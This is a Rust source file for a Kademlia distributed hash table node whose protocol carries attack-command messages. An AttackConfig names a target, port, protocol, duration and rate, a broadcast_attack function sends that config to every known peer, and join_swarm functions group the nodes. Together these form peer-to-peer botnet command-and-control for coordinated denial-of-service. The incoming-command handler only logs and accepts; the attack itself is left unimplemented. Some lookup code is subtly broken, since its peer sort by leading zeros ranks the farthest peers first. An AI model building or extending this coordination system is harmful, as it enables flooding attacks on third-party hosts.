use std::collections::HashMap;
use std::net::{SocketAddr, UdpSocket};
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};
use rand::Rng;
use sha1::{Sha1, Digest};
use tokio::time::timeout;
use serde::{Serialize, Deserialize};
use thiserror::Error;

/// Kademlia configuration constants
const K_BUCKET_SIZE: usize = 20;  // Standard Kademlia k-bucket size
const ALPHA: usize = 3;           // Concurrency parameter for lookups
const ID_LENGTH: usize = 20;      // 160-bit node ID (20 bytes)
const RPC_TIMEOUT: Duration = Duration::from_secs(5);

/// 160-bit node identifier
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub struct NodeId([u8; ID_LENGTH]);

impl NodeId {
    /// Generate a random node ID
    pub fn random() -> Self {
        let mut rng = rand::thread_rng();
        let mut id = [0u8; ID_LENGTH];
        rng.fill(&mut id);
        NodeId(id)
    }

    /// Create node ID from bytes
    pub fn from_bytes(bytes: [u8; ID_LENGTH]) -> Self {
        NodeId(bytes)
    }

    /// Get bytes representation
    pub fn as_bytes(&self) -> &[u8; ID_LENGTH] {
        &self.0
    }

    /// Calculate XOR distance between two node IDs
    pub fn distance(&self, other: &NodeId) -> NodeId {
        let mut result = [0u8; ID_LENGTH];
        for i in 0..ID_LENGTH {
            result[i] = self.0[i] ^ other.0[i];
        }
        NodeId(result)
    }

    /// Get the bit position of the most significant bit (for k-bucket selection)
    pub fn leading_zeros(&self) -> u32 {
        for (i, &byte) in self.0.iter().enumerate() {
            if byte != 0 {
                return (i * 8) as u32 + byte.leading_zeros();
            }
        }
        ID_LENGTH as u32 * 8
    }
}

/// Peer information
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PeerInfo {
    pub node_id: NodeId,
    pub address: SocketAddr,
    #[serde(skip, default = "Instant::now")]
    pub last_seen: Instant,
}

impl Default for PeerInfo {
    fn default() -> Self {
        Self {
            node_id: NodeId::random(),
            address: "127.0.0.1:0".parse().unwrap(),
            last_seen: Instant::now(),
        }
    }
}

impl PeerInfo {
    pub fn new(node_id: NodeId, address: SocketAddr) -> Self {
        Self {
            node_id,
            address,
            last_seen: Instant::now(),
        }
    }

    pub fn update_last_seen(&mut self) {
        self.last_seen = Instant::now();
    }
}

/// K-bucket for storing peers
#[derive(Debug)]
pub struct KBucket {
    peers: Vec<PeerInfo>,
    last_updated: Instant,
}

impl KBucket {
    pub fn new() -> Self {
        Self {
            peers: Vec::new(),
            last_updated: Instant::now(),
        }
    }

    /// Add a peer to the k-bucket
    pub fn add_peer(&mut self, peer: PeerInfo) -> bool {
        // Check if peer already exists
        if let Some(existing) = self.peers.iter_mut().find(|p| p.node_id == peer.node_id) {
            existing.update_last_seen();
            return true;
        }

        // If bucket is not full, add the peer
        if self.peers.len() < K_BUCKET_SIZE {
            self.peers.push(peer);
            self.last_updated = Instant::now();
            return true;
        }

        // Bucket is full - implement LRU eviction
        // In a real implementation, we would ping the least recently seen peer
        // For now, we'll just reject the new peer
        false
    }

    /// Get all peers in the bucket
    pub fn get_peers(&self) -> &[PeerInfo] {
        &self.peers
    }

    /// Remove a peer from the bucket
    pub fn remove_peer(&mut self, node_id: &NodeId) -> bool {
        if let Some(pos) = self.peers.iter().position(|p| &p.node_id == node_id) {
            self.peers.remove(pos);
            self.last_updated = Instant::now();
            true
        } else {
            false
        }
    }
}

/// Routing table for Kademlia
#[derive(Debug)]
pub struct RoutingTable {
    node_id: NodeId,
    buckets: Vec<KBucket>,
}

impl RoutingTable {
    pub fn new(node_id: NodeId) -> Self {
        let mut buckets = Vec::new();
        for _ in 0..(ID_LENGTH * 8) {
            buckets.push(KBucket::new());
        }

        Self { node_id, buckets }
    }

    /// Add a peer to the appropriate k-bucket
    pub fn add_peer(&mut self, peer: PeerInfo) {
        if peer.node_id == self.node_id {
            return; // Don't add ourselves
        }

        let distance = self.node_id.distance(&peer.node_id);
        let bucket_index = (ID_LENGTH * 8 - 1) - distance.leading_zeros() as usize;
        
        if bucket_index < self.buckets.len() {
            self.buckets[bucket_index].add_peer(peer);
        }
    }

    /// Find the closest peers to a target node ID
    pub fn find_closest_peers(&self, target: &NodeId, count: usize) -> Vec<PeerInfo> {
        let mut all_peers = Vec::new();
        
        // Collect all peers from all buckets
        for bucket in &self.buckets {
            all_peers.extend(bucket.get_peers().iter().cloned());
        }

        // Sort by distance to target
        all_peers.sort_by_key(|peer| target.distance(&peer.node_id).leading_zeros());
        
        // Return the closest ones
        all_peers.into_iter().take(count).collect()
    }

    /// Get all known peers
    pub fn get_all_peers(&self) -> Vec<PeerInfo> {
        let mut all_peers = Vec::new();
        for bucket in &self.buckets {
            all_peers.extend(bucket.get_peers().iter().cloned());
        }
        all_peers
    }

    /// Remove a peer from the routing table
    pub fn remove_peer(&mut self, node_id: &NodeId) {
        let distance = self.node_id.distance(node_id);
        let bucket_index = (ID_LENGTH * 8 - 1) - distance.leading_zeros() as usize;
        
        if bucket_index < self.buckets.len() {
            self.buckets[bucket_index].remove_peer(node_id);
        }
    }
}

/// Kademlia RPC messages
#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum KademliaRpc {
    Ping {
        sender: NodeId,
    },
    Pong {
        sender: NodeId,
    },
    FindNode {
        sender: NodeId,
        target: NodeId,
    },
    FindNodeResponse {
        sender: NodeId,
        peers: Vec<PeerInfo>,
    },
    FindValue {
        sender: NodeId,
        key: [u8; ID_LENGTH],
    },
    FindValueResponse {
        sender: NodeId,
        value: Option<Vec<u8>>,
        peers: Vec<PeerInfo>,
    },
    Store {
        sender: NodeId,
        key: [u8; ID_LENGTH],
        value: Vec<u8>,
    },
    StoreResponse {
        sender: NodeId,
        success: bool,
    },
    AttackCommand {
        sender: NodeId,
        config: AttackConfig,
    },
    AttackCommandResponse {
        sender: NodeId,
        accepted: bool,
    },
}

/// Attack configuration for P2P coordination
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AttackConfig {
    pub target: String,
    pub port: u16,
    pub protocol: String,
    pub duration: u64,
    pub rate: u64,
    pub swarm_id: [u8; ID_LENGTH],
}

/// DHT storage for key-value pairs
#[derive(Debug)]
pub struct DhtStorage {
    data: HashMap<[u8; ID_LENGTH], Vec<u8>>,
}

impl DhtStorage {
    pub fn new() -> Self {
        Self {
            data: HashMap::new(),
        }
    }

    pub fn store(&mut self, key: [u8; ID_LENGTH], value: Vec<u8>) {
        self.data.insert(key, value);
    }

    pub fn get(&self, key: &[u8; ID_LENGTH]) -> Option<&Vec<u8>> {
        self.data.get(key)
    }

    pub fn remove(&mut self, key: &[u8; ID_LENGTH]) -> Option<Vec<u8>> {
        self.data.remove(key)
    }
}

/// Kademlia errors
#[derive(Error, Debug)]
pub enum KademliaError {
    #[error("Network error: {0}")]
    Network(#[from] std::io::Error),
    #[error("Serialization error: {0}")]
    Serialization(String),
    #[error("Timeout error")]
    Timeout,
    #[error("Invalid node ID")]
    InvalidNodeId,
    #[error("Bootstrap failed")]
    BootstrapFailed,
}

/// Main Kademlia node implementation
pub struct KademliaNode {
    node_id: NodeId,
    routing_table: Arc<Mutex<RoutingTable>>,
    storage: Arc<Mutex<DhtStorage>>,
    socket: UdpSocket,
    bind_addr: SocketAddr,
}

impl KademliaNode {
    /// Create a new Kademlia node
    pub fn new(bind_addr: SocketAddr) -> Result<Self, KademliaError> {
        let node_id = NodeId::random();
        let routing_table = Arc::new(Mutex::new(RoutingTable::new(node_id)));
        let storage = Arc::new(Mutex::new(DhtStorage::new()));
        
        let socket = UdpSocket::bind(bind_addr)?;
        socket.set_nonblocking(true)?;

        Ok(Self {
            node_id,
            routing_table,
            storage,
            socket,
            bind_addr,
        })
    }

    /// Get the node ID
    pub fn node_id(&self) -> NodeId {
        self.node_id
    }

    /// Get the bind address
    pub fn bind_addr(&self) -> SocketAddr {
        self.bind_addr
    }

    /// Bootstrap the node by connecting to seed nodes
    pub async fn bootstrap(&mut self, seed_nodes: &[SocketAddr]) -> Result<(), KademliaError> {
        if seed_nodes.is_empty() {
            return Err(KademliaError::BootstrapFailed);
        }

        // Send PING to all seed nodes
        for &seed_addr in seed_nodes {
            if let Err(e) = self.ping_node(seed_addr).await {
                tracing::warn!("Failed to ping seed node {}: {}", seed_addr, e);
            }
        }

        // Perform a lookup for our own node ID to populate routing table
        let _ = self.find_node(&self.node_id).await;

        Ok(())
    }

    /// Send a PING RPC to a node
    pub async fn ping_node(&self, addr: SocketAddr) -> Result<(), KademliaError> {
        let rpc = KademliaRpc::Ping {
            sender: self.node_id,
        };

        let response = self.send_rpc(addr, rpc).await?;
        
        match response {
            KademliaRpc::Pong { sender } => {
                let peer = PeerInfo::new(sender, addr);
                self.routing_table.lock().unwrap().add_peer(peer);
                Ok(())
            }
            _ => Err(KademliaError::Network(std::io::Error::new(
                std::io::ErrorKind::InvalidData,
                "Unexpected response to PING",
            ))),
        }
    }

    /// Find nodes closest to a target ID
    pub async fn find_node(&self, target: &NodeId) -> Result<Vec<PeerInfo>, KademliaError> {
        let mut closest_peers = {
            let routing_table = self.routing_table.lock().unwrap();
            routing_table.find_closest_peers(target, K_BUCKET_SIZE)
        };

        if closest_peers.is_empty() {
            return Ok(Vec::new());
        }

        // Iterative lookup
        let mut queried = std::collections::HashSet::new();
        let mut found_peers = std::collections::HashMap::new();

        for _ in 0..10 {  // Maximum 10 iterations
            let mut queries = Vec::new();
            
            // Select up to ALPHA nodes to query
            for peer in &closest_peers {
                if !queried.contains(&peer.node_id) && queries.len() < ALPHA {
                    queries.push(peer.clone());
                    queried.insert(peer.node_id);
                }
            }

            if queries.is_empty() {
                break;
            }

            // Send FIND_NODE RPCs concurrently
            let mut responses = Vec::new();
            for peer in queries {
                let rpc = KademliaRpc::FindNode {
                    sender: self.node_id,
                    target: *target,
                };

                if let Ok(response) = self.send_rpc(peer.address, rpc).await {
                    responses.push(response);
                }
            }

            // Process responses
            let mut new_peers = Vec::new();
            for response in responses {
                if let KademliaRpc::FindNodeResponse { sender, peers } = response {
                    found_peers.insert(sender, ());
                    new_peers.extend(peers);
                }
            }

            // Update closest peers
            new_peers.sort_by_key(|peer| target.distance(&peer.node_id).leading_zeros());
            closest_peers = new_peers.into_iter().take(K_BUCKET_SIZE).collect();

            // Add new peers to routing table
            {
                let mut routing_table = self.routing_table.lock().unwrap();
                for peer in &closest_peers {
                    routing_table.add_peer(peer.clone());
                }
            }
        }

        Ok(closest_peers)
    }

    /// Store a value in the DHT
    pub async fn store(&self, key: [u8; ID_LENGTH], value: Vec<u8>) -> Result<(), KademliaError> {
        let target_id = NodeId::from_bytes(key);
        let closest_peers = self.find_node(&target_id).await?;

        // Store on the K closest nodes
        let store_peers = closest_peers.into_iter().take(K_BUCKET_SIZE).collect::<Vec<_>>();
        
        for peer in store_peers {
            let rpc = KademliaRpc::Store {
                sender: self.node_id,
                key,
                value: value.clone(),
            };

            if let Err(e) = self.send_rpc(peer.address, rpc).await {
                tracing::warn!("Failed to store on peer {}: {}", peer.address, e);
            }
        }

        // Also store locally
        self.storage.lock().unwrap().store(key, value);

        Ok(())
    }

    /// Find a value in the DHT
    pub async fn find_value(&self, key: [u8; ID_LENGTH]) -> Result<Option<Vec<u8>>, KademliaError> {
        // Check local storage first
        if let Some(value) = self.storage.lock().unwrap().get(&key) {
            return Ok(Some(value.clone()));
        }

        let target_id = NodeId::from_bytes(key);
        let closest_peers = {
            let routing_table = self.routing_table.lock().unwrap();
            routing_table.find_closest_peers(&target_id, K_BUCKET_SIZE)
        };

        // Query peers for the value
        for peer in closest_peers {
            let rpc = KademliaRpc::FindValue {
                sender: self.node_id,
                key,
            };

            if let Ok(response) = self.send_rpc(peer.address, rpc).await {
                if let KademliaRpc::FindValueResponse { value: Some(value), .. } = response {
                    return Ok(Some(value));
                }
            }
        }

        Ok(None)
    }

    /// Broadcast an attack command to the swarm
    pub async fn broadcast_attack(&self, config: &AttackConfig) -> Result<(), KademliaError> {
        let all_peers = {
            let routing_table = self.routing_table.lock().unwrap();
            routing_table.get_all_peers()
        };

        for peer in all_peers {
            let rpc = KademliaRpc::AttackCommand {
                sender: self.node_id,
                config: config.clone(),
            };

            if let Err(e) = self.send_rpc(peer.address, rpc).await {
                tracing::warn!("Failed to send attack command to peer {}: {}", peer.address, e);
            }
        }

        Ok(())
    }

    /// Join a swarm by storing our node info under the swarm ID
    pub async fn join_swarm(&mut self, swarm_id: &[u8]) -> Result<(), KademliaError> {
        let mut hasher = Sha1::new();
        hasher.update(swarm_id);
        let key = hasher.finalize().into();

        let node_info = serde_json::to_vec(&PeerInfo::new(self.node_id, self.bind_addr))
            .map_err(|e| KademliaError::Serialization(e.to_string()))?;

        self.store(key, node_info).await
    }

    /// Find peers in a swarm
    pub async fn find_swarm_peers(&self, swarm_id: &[u8]) -> Result<Vec<PeerInfo>, KademliaError> {
        let mut hasher = Sha1::new();
        hasher.update(swarm_id);
        let key = hasher.finalize().into();

        if let Some(data) = self.find_value(key).await? {
            let peer: PeerInfo = serde_json::from_slice(&data)
                .map_err(|e| KademliaError::Serialization(e.to_string()))?;
            Ok(vec![peer])
        } else {
            Ok(Vec::new())
        }
    }

    /// Send an RPC and wait for response
    async fn send_rpc(&self, addr: SocketAddr, rpc: KademliaRpc) -> Result<KademliaRpc, KademliaError> {
        let data = serde_json::to_vec(&rpc)
            .map_err(|e| KademliaError::Serialization(e.to_string()))?;

        self.socket.send_to(&data, addr)?;

        // Wait for response with timeout
        let mut buf = [0u8; 65536];
        let result = timeout(RPC_TIMEOUT, async {
            loop {
                match self.socket.recv_from(&mut buf) {
                    Ok((len, from_addr)) if from_addr == addr => {
                        let response: KademliaRpc = serde_json::from_slice(&buf[..len])
                            .map_err(|e| KademliaError::Serialization(e.to_string()))?;
                        return Ok(response);
                    }
                    Ok(_) => continue, // Ignore messages from other addresses
                    Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock => {
                        tokio::task::yield_now().await;
                        continue;
                    }
                    Err(e) => return Err(KademliaError::Network(e)),
                }
            }
        }).await;

        match result {
            Ok(response) => response,
            Err(_) => Err(KademliaError::Timeout),
        }
    }

    /// Handle incoming RPC messages
    pub async fn handle_rpc(&self, rpc: KademliaRpc, from_addr: SocketAddr) -> Option<KademliaRpc> {
        match rpc {
            KademliaRpc::Ping { sender } => {
                // Add sender to routing table
                let peer = PeerInfo::new(sender, from_addr);
                self.routing_table.lock().unwrap().add_peer(peer);

                Some(KademliaRpc::Pong {
                    sender: self.node_id,
                })
            }

            KademliaRpc::FindNode { sender, target } => {
                // Add sender to routing table
                let peer = PeerInfo::new(sender, from_addr);
                self.routing_table.lock().unwrap().add_peer(peer);

                // Find closest peers to target
                let peers = {
                    let routing_table = self.routing_table.lock().unwrap();
                    routing_table.find_closest_peers(&target, K_BUCKET_SIZE)
                };

                Some(KademliaRpc::FindNodeResponse {
                    sender: self.node_id,
                    peers,
                })
            }

            KademliaRpc::FindValue { sender, key } => {
                // Add sender to routing table
                let peer = PeerInfo::new(sender, from_addr);
                self.routing_table.lock().unwrap().add_peer(peer);

                // Check if we have the value
                let value = self.storage.lock().unwrap().get(&key).cloned();

                if value.is_some() {
                    Some(KademliaRpc::FindValueResponse {
                        sender: self.node_id,
                        value,
                        peers: Vec::new(),
                    })
                } else {
                    // Return closest peers
                    let target_id = NodeId::from_bytes(key);
                    let peers = {
                        let routing_table = self.routing_table.lock().unwrap();
                        routing_table.find_closest_peers(&target_id, K_BUCKET_SIZE)
                    };

                    Some(KademliaRpc::FindValueResponse {
                        sender: self.node_id,
                        value: None,
                        peers,
                    })
                }
            }

            KademliaRpc::Store { sender, key, value } => {
                // Add sender to routing table
                let peer = PeerInfo::new(sender, from_addr);
                self.routing_table.lock().unwrap().add_peer(peer);

                // Store the value
                self.storage.lock().unwrap().store(key, value);

                Some(KademliaRpc::StoreResponse {
                    sender: self.node_id,
                    success: true,
                })
            }

            KademliaRpc::AttackCommand { sender, config } => {
                // Add sender to routing table
                let peer = PeerInfo::new(sender, from_addr);
                self.routing_table.lock().unwrap().add_peer(peer);

                // In a real implementation, we would validate and execute the attack
                tracing::info!("Received attack command from {}: {:?}", sender.as_bytes()[0], config);

                Some(KademliaRpc::AttackCommandResponse {
                    sender: self.node_id,
                    accepted: true,
                })
            }

            // Response messages don't need replies
            KademliaRpc::Pong { .. } |
            KademliaRpc::FindNodeResponse { .. } |
            KademliaRpc::FindValueResponse { .. } |
            KademliaRpc::StoreResponse { .. } |
            KademliaRpc::AttackCommandResponse { .. } => None,
        }
    }

    /// Start the node's message handling loop
    pub async fn run(&self) -> Result<(), KademliaError> {
        let mut buf = [0u8; 65536];

        loop {
            match self.socket.recv_from(&mut buf) {
                Ok((len, from_addr)) => {
                    if let Ok(rpc) = serde_json::from_slice::<KademliaRpc>(&buf[..len]) {
                        if let Some(response) = self.handle_rpc(rpc, from_addr).await {
                            let response_data = serde_json::to_vec(&response)
                                .map_err(|e| KademliaError::Serialization(e.to_string()))?;
                            
                            if let Err(e) = self.socket.send_to(&response_data, from_addr) {
                                tracing::warn!("Failed to send response to {}: {}", from_addr, e);
                            }
                        }
                    }
                }
                Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock => {
                    tokio::task::yield_now().await;
                }
                Err(e) => {
                    tracing::error!("Socket error: {}", e);
                    return Err(KademliaError::Network(e));
                }
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_node_id_distance() {
        let id1 = NodeId::from_bytes([1; ID_LENGTH]);
        let id2 = NodeId::from_bytes([2; ID_LENGTH]);
        let distance = id1.distance(&id2);
        
        // XOR of [1; 20] and [2; 20] should be [3; 20]
        assert_eq!(distance.as_bytes(), &[3; ID_LENGTH]);
    }

    #[test]
    fn test_routing_table_add_peer() {
        let node_id = NodeId::random();
        let mut routing_table = RoutingTable::new(node_id);
        
        let peer_id = NodeId::random();
        let peer = PeerInfo::new(peer_id, "127.0.0.1:8000".parse().unwrap());
        
        routing_table.add_peer(peer.clone());
        
        let closest = routing_table.find_closest_peers(&peer_id, 1);
        assert_eq!(closest.len(), 1);
        assert_eq!(closest[0].node_id, peer_id);
    }

    #[test]
    fn test_dht_storage() {
        let mut storage = DhtStorage::new();
        let key = [1; ID_LENGTH];
        let value = b"test value".to_vec();
        
        storage.store(key, value.clone());
        assert_eq!(storage.get(&key), Some(&value));
        
        let retrieved = storage.remove(&key);
        assert_eq!(retrieved, Some(value));
        assert_eq!(storage.get(&key), None);
    }
}